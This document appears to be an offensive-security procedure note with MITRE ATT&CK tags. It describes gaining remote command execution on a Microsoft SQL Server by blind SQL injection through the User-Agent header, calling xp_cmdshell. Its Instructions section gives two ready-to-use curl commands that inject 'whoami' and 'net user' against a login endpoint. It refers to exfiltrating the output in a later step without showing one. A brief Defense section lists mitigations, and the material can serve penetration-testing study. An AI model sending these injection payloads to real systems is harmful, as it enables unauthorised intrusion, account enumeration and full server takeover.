---
tags:
  - rce
  - xp_cmdshell
  - command-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/execute-xp_cmdshell-command]]'
verified: false
platforms:
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Windows Command Shell]]'
updated_at: '2025-12-14T03:46:20.449Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: da168fa9-8514-4353-84ee-0db75dd6f732
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Windows Command Shell]]'
---
# Execute Remote OS Commands using xp_cmdshell

## Summary

This procedure uses the enabled xp_cmdshell to inject and execute arbitrary Windows OS commands via blind SQL injection in the User-Agent header, achieving remote code execution on the server.

## Description

With xp_cmdshell active, craft SQL to call it with OS commands like enumeration or file access. Blind nature requires exfil for output. Targets MSSQL on Windows; outcomes include full server control.

## Requirements

1. xp_cmdshell enabled from prior procedure
2. SQLi access with execution privileges
3. Knowledge of Windows commands (cmd.exe)

## Defense

Defensive measures and detection strategies:

- Keep xp_cmdshell disabled and monitor its usage in SQL logs
- Restrict DB user privileges to prevent extended proc calls
- Implement command logging and anomaly detection on server

## Objectives

1. Invoke xp_cmdshell with target OS command
2. Achieve RCE for enumeration or persistence
3. Prepare for output exfiltration

## Instructions

### Step 1: Test xp_cmdshell

**Context**: Run a simple command to verify execution.

**Command** ([[commands/execute-xp_cmdshell-command]]):
```bash
curl -X POST https://target.example.com/login -H "User-Agent: '; EXEC xp_cmdshell 'whoami';--" -d "username=test&password=test"
```

> No direct output; success via exfil or side effects.

### Step 2: Run Enumeration Command

**Context**: Execute a useful command like net user list.

**Command** ([[commands/execute-xp_cmdshell-command]]):
```bash
curl -X POST https://target.example.com/login -H "User-Agent: '; EXEC xp_cmdshell 'net user';--" -d "username=test&password=test"
```

> Command runs; capture output in next step.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Windows Command Shell]]

### Sub-Techniques


## Commands Used

- [[commands/execute-xp_cmdshell-command]]

## Tools Used


## Tags

- [[rce]]
- [[command-injection]]
